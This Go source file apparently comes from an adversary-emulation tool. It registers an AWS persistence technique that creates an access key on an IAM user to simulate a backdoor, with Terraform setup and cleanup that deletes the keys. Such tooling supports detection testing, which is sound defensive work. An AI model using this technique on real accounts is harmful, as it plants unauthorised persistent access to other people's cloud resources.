package aws

import (
	"context"
	_ "embed"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		Name: "aws.persistence.backdoor-iam-user",
		Description: `
Establishes persistence by creating an access key on an existing IAM user.

Warm-up: Create the pre-requisite IAM user.
Detonation: Create the access key.
`,
		Platform:                   stratus.AWS,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate: func(terraformOutputs map[string]string) error {
			iamClient := iam.NewFromConfig(providers.GetAWSProvider())
			log.Println("Creating access key on legit IAM user to simulate backdoor")
			result, err := iamClient.CreateAccessKey(context.Background(), &iam.CreateAccessKeyInput{UserName: aws.String("sample-legit-user")})
			if err != nil {
				return err
			}
			log.Println("Successfully created access key " + *result.AccessKey.AccessKeyId)
			return nil
		},
		Cleanup: func() error {
			iamClient := iam.NewFromConfig(providers.GetAWSProvider())
			log.Println("Removing access key from IAM user")
			result, err := iamClient.ListAccessKeys(context.Background(), &iam.ListAccessKeysInput{UserName: aws.String("sample-legit-user")})
			if err != nil {
				return err
			}
			for i := range result.AccessKeyMetadata {
				iamClient.DeleteAccessKey(context.Background(), &iam.DeleteAccessKeyInput{AccessKeyId: result.AccessKeyMetadata[i].AccessKeyId})
			}

			return nil
		},
	})
}
